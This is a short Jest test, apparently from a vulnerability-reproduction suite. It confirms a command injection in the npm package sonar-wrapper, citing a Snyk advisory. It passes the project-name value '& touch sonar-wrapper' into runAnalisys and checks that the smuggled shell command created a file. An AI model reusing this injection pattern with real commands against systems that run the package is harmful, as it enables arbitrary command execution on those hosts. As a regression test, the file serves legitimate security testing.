//https://snyk.io/vuln/SNYK-JS-SONARWRAPPER-1050980
test("Command Injection in sonar-wrapper", () => {
  const root = require("sonar-wrapper");
  const fs = require("fs");
  const path = "./sonar-wrapper";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = { "sonar.projectName": "& touch sonar-wrapper" };
  root.runAnalisys("./", options, []);
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
